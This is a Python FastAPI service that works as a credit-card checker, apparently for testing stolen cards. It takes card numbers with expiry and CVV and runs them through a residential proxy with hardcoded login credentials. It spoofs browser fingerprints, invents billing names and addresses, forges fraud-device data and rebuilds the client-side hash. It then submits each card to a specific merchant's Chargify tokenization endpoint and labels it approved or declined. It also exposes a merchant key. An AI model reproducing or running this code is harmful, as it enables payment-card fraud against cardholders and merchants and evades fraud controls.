from fastapi import FastAPI, HTTPException, Request, APIRouter
from curl_cffi import requests
import hashlib
from faker import Faker
from browserforge.headers import HeaderGenerator
import random
from bs4 import BeautifulSoup
import uuid
import os
import asyncio
from typing import Optional
import traceback

fake = Faker("en_US")
giners = [
    'chrome99', 'chrome100', 'chrome101', 'chrome104', 'chrome107', 
    'chrome110', 'chrome116', 'chrome119', 'chrome120', 'chrome123', 
    'chrome124', 'chrome131', 'chrome99_android', 'chrome131_android', 
    'edge99', 'edge101', 'safari15_3', 'safari15_5', 'safari17_0', 
    'safari17_2_ios', 'safari18_0', 'safari18_0_ios'
]

def generate_random_device_id():
    length = random.randint(8, 36)
    seed = os.urandom(32)
    md5_hash = hashlib.md5(seed).hexdigest()
    sha1_hash = hashlib.sha1(seed).hexdigest()
    sha256_hash = hashlib.sha256(seed).hexdigest()
    sha512_hash = hashlib.sha512(seed).hexdigest()
    combined_hash = hex(int(md5_hash, 16) ^ int(sha1_hash, 16) ^ int(sha256_hash, 16) ^ int(sha512_hash, 16))[2:]
    return combined_hash[:length]


def generate_random_email():
    domains = ["grubhub.com"]
    seed = os.urandom(32)
    md5_hash = hashlib.md5(seed).hexdigest()
    sha1_hash = hashlib.sha1(seed).hexdigest()
    sha256_hash = hashlib.sha256(seed).hexdigest()
    sha512_hash = hashlib.sha512(seed).hexdigest()
    combined_hash = hex(int(md5_hash, 16) ^ int(sha1_hash, 16) ^ int(sha256_hash, 16) ^ int(sha512_hash, 16))[2:]
    name_length = random.randint(8, 20)
    name = combined_hash[:name_length]
    domain = random.choice(domains)
    return f"{name}@{domain}"

auth_check = APIRouter(prefix="/auth_check")
@auth_check.get("/")
async def tokenize_card(request: Request):
    try:
        lista = request.query_params.get('lista').split('|')
        cc = lista[0]
        mm = lista[1]
        yy = lista[2]
        cv = lista[3]

        # First get bin info
        bin_response = requests.get(f'https://api.juspay.in/cardbins/{cc[:6]}')
        bin_data = bin_response.json()
        brand = bin_data.get('brand', '').lower()
        country = bin_data.get('country', '').lower()
        card_subtype = bin_data.get('card_sub_type', '').lower()

        # Validate card brand
        if brand not in {"visa", "mastercard", "amex", "jcb"}:
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Unknown ⚠️",
                "message": "This credit card type is not accepted.",
                "bin_info": bin_data
            }
        elif card_subtype in {"maestro"}:
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Unknown ⚠️",
                "message": "This credit card type is not accepted.",
                "bin_info": bin_data
            }
        # Setup session
        random_browser = random.choice(giners)
        sess = requests.Session(verify=False)
        
        sess.proxies.update({
            "http":  f"http://7b1e08748710-res-US:S0f5DbFJDAkxpa2@residential.resi.gg:5959",
            "https": f"http://7b1e08748710-res-US:S0f5DbFJDAkxpa2@residential.resi.gg:5959"
        })
        # Use provided proxy or default
        # sess.proxies.update({
        #     "http": "http://desoforgit_gmail_com-dc:26781525-country-US@la.residential.rayobyte.com:8000",
        #     "https": "http://desoforgit_gmail_com-dc:26781525-country-US@la.residential.rayobyte.com:8000"
        # })

        headers_generator = HeaderGenerator()
        headers = headers_generator.generate()
        sess.headers = dict(headers)



        country = "DK"
        # Generate headers for first request
        headers = {
            'Host': 'blue-line-trading-system.chargifypay.com',
            'Priority': 'u=0',
        }

        # Get security token
        html_data = sess.get(
            'https://blue-line-trading-system.chargifypay.com/subscribe/bcyt93vv6s6y',
            headers=headers
        ).text

        soup = BeautifulSoup(html_data, "html.parser")
        div = soup.find("div", id="chargify-js-form")
        token = div.get("data-security-token")
        print(token)


        # Prepare headers for token request
        headers = {
            'Referer': 'https://js.chargify.com/',
            'content-type': 'application/json',
            'Origin': 'https://js.chargify.com',
            'Priority': 'u=0',
        }


        json_data = {
            'key': 'chjs_6spy9mwc54xj8dq7n94vhfx9',
            'revision': '2025-07-16',
            'credit_card': {
                'full_number': cc,
                'expiration_month': mm,
                'expiration_year': yy,
                'cvv': cv,
                'billing_address': f'{fake.street_address()}',
                'billing_city': fake.city(),
                'billing_country': country.upper(),
                'billing_state': fake.state_abbr(include_territories=False),
                'billing_zip': f'{fake.zipcode()}',
                'first_name': fake.first_name(),
                'last_name': fake.last_name(),
                'device_data': "{\"device_session_id\":\""+generate_random_device_id()+"\",\"fraud_merchant_id\":\""+generate_random_device_id()+"\",\"correlation_id\":\""+generate_random_device_id()+"\",\"browser_info\":{\"user_agent\":\""+sess.headers.get('User-Agent')+"\",\"screen_width\":"+str(random.randint(400,4000))+",\"screen_height\":"+str(random.randint(400,4000))+",\"timezone_offset\":-70,\"language\":\"en-US\",\"java_enabled\":false}}",
            },
            'security_token': token,
            'currency': 'USD',
            'psp_token': f'{generate_random_device_id()}',
            'h': '',
        }


        # Generate hash
        card = json_data["credit_card"]
        del card["device_data"]
        values = [v for _, v in sorted(card.items())]
        joined = "ﾠ".join(values)
        final_hash = hashlib.sha1(joined.encode('utf-8')).hexdigest()
        json_data['h'] = final_hash

        # Make the token request
        response = sess.post(
            'https://blue-line-trading-system.chargify.com/js/tokens.json',
            headers=headers,
            json=json_data
        )
        response_data = response.json()

        if response_data.get('token'):
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Approved ✅",
                "message": "Card added",
                "bin_info": bin_data,
                "token": response_data['token']
            }
        elif response_data.get('errors') == 'Processor declined: Unavailable ()':
            message = response_data.get('errors', 'Card declined')
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Unknown ⚠️",
                "message": f"{message}",
                "bin_info": bin_data,
                "token": response_data['token']
            }
        elif "Approved (1000)" in response.text:
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Approved ✅",
                "message": "Approved (1000)",
                "bin_info": bin_data,
                "token": response_data['token']
            }
        else:
            message = response_data.get('errors', 'Card declined')
            return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "Declined ❌",
                "message": f"{message}",
                "bin_info": bin_data
            }

    except Exception as e:
        return {
                "card": f"{cc}|{mm}|{yy}|{cv}",
                "status": "API Error ⚠️",
                "message": "Recheck",
                "bin_info": bin_data if 'bin_data' in locals() else None,
                "ecv": str(traceback.format_exc())
            }
